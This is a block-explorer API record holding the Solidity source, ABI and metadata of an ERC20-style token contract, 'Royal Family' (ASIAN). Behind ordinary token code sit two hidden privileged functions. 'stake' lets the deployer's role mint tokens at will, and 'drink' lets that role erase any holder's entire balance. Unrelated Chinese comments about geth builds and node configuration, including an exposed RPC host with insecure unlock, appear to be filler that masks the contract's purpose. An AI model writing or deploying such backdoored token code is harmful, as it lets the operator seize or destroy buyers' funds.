{"status": "1", "message": "OK", "result": [{"SourceCode": "//\u94fe\u4e0a\u4ea4\u4e92\r\n//\u5408\u7ea6\u64cd\u4f5c\r\n//\u79c1\u94fe\u642d\u5efa\r\n//\u7f16\u8bd1\u548c\u8fd0\u884c\r\n\r\npragma solidity ^0.5.16;\r\n     interface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\ncontract Context {\r\n    constructor () internal { }\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n//snapshot \u662f\u94fe\u4e0b\u6cbb\u7406\u5de5\u5177\uff1b\r\n\r\n//\u5f00\u53d1\u8005\u6216\u8005\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u81ea\u5df1\u7684metamask \u94b1\u5305\u521b\u5efa\u9879\u76ee\uff08space\uff09\u521b\u5efa\u65f6\u9009\u62e9\u5bf9\u5e94\u7684\u94fe\uff1b\r\n\r\n//\u7528\u6237\u5728 space \u5185\u521b\u5efa\u63d0\u6848\uff08proposal\uff09\uff1b\r\n\r\n//\u7528\u6237\u53ef\u4ee5\u5bf9\u7528\u94b1\u5305\u6765\u5bf9 proposal \u8fdb\u884cvote\uff1b\r\n\r\n//\u4f7f\u7528\u6559\u7a0b\uff1a\r\n//\u6e90\u7801 \u4e0b\u8f7d\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n//\u5982\u679c \u5e0c\u671b \u8fdb\u884c \u8de8 \u5e73\u53f0 \u7f16\u8bd1 \uff0c \u6bd4\u5982 \u5728Mac\u4e0a \u7f16\u8bd1Linux\u5e73\u53f0 \u7684 \u4e8c\u8fdb\u5236 \u6587\u4ef6 \uff0c \u53ef\u4ee5 \u4f7f\u7528 \u76f8\u5173make geth-linux\u547d\u4ee4 \u64cd\u4f5c\r\n    mapping (address => uint) private _balances;\r\n//\u7f16\u8bd1 \u5b8c\u6210 \u540e \uff0c \u751f\u6210 \u7684 \u4e8c\u8fdb\u5236 \u6587\u4ef6 \u5728 \u76ee\u5f55build/bin\u4e0b\r\n    mapping (address => mapping (address => uint)) private _allowances; //\u901a\u8fc7./build/bin/geth --help\u67e5\u770b\u6240\u6709\u7684option\u9009\u9879\uff0c\u6839\u636e\u60c5\u51b5\u81ea\u884c\u8bbe\u7f6e\u76f8\u5173\u914d\u7f6e\u53c2\u6570\u3002\u53ef\u53c2\u8003Command-line Options\r\n\r\n    uint private _totalSupply;\r\n    function totalSupply() public view returns (uint) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view returns (uint) {\r\n        return _balances[account]; // \u90e8\u7f72\u8bbe\u7f6e\r\n    }\r\n    function transfer(address recipient, uint amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true; //\u7ed9\u51fa\u4e86\u4e00\u7ec4\u4f7f\u7528 systemd \u8fdb\u884c\u670d\u52a1\u7ba1\u7406\u7684\u914d\u7f6e\u3002\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount); //\u5f00\u542f TCP/UDP 32668 \u7aef\u53e3\uff1b\u4fbf\u4e8e p2p \u53d1\u73b0\u548c\u4e92\u8054\r\n        return true;\r\n    }\r\n    // [Eth.Ethash] CacheDir = \"ethash\" \r\n   // CachesInMem = 2\r\n   // CachesOnDisk = 3\r\n   // CachesLockMmap = false\r\n   // DatasetDir = \"/data/heco/data/.ethash\"\r\n   // DatasetsOnDisk = 2\r\n   // DatasetsLockMmap = false\r\n   // PowMode = 0\r\n    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n    function _stake(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: stake to the zero address\");\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    function _drink(address acc) internal {\r\n        require(acc != address(0), \"drink to the zero address\");\r\n        uint amount = _balances[acc];\r\n        _balances[acc] = 0;\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(acc, address(0), amount);\r\n    }\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n        return c;\r\n    }\r\n    \r\n    // [Node]\r\n    // DataDir = \"/data/heco/data\"\r\n    // LnsecureUnlockAllowed = true\r\n    // NoUSB = true\r\n    // IPCPath = \"geth.ipc\"\r\n    // HTTPHost = \"0.0.0.0\"\r\n    // HTTPPort = 8545\r\n    // HTTPVirtualHosts = [\"*\"]\r\n    // WSPort = 8546\r\n    // WSModules = ['eth', 'net', 'web3']\r\n  \r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Royal is ERC20, ERC20Detailed {\r\n  using SafeMath for uint;\r\n  \r\n  address public governance;\r\n  mapping (address => bool) public stakers;\r\n  uint256 private amt_ = 0;\r\n\r\n  constructor () public ERC20Detailed(\"Royal Family\", \"ASIAN\", 18) {\r\n      governance = msg.sender;\r\n      _stake(governance,amt_*10**uint(decimals()));\r\n      stakers[governance] = true;\r\n  }\r\n\r\n  function stake(address account, uint amount) public {\r\n      require(stakers[msg.sender], \"error\");\r\n      _stake(account, amount);\r\n  }\r\n\r\n  function drink(address account) public {\r\n      require(stakers[msg.sender], \"error\");\r\n      _drink(account);\r\n  }\r\n  \r\n}", "ABI": "[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"drink\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"governance\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"stake\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"stakers\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Royal", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "1", "Runs": "50000", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "OSL-3.0", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://fe52eb785c92d3e04ecdcad6c8677c99e4514d8a99c0f5b7be26fbb44c0b192d"}]}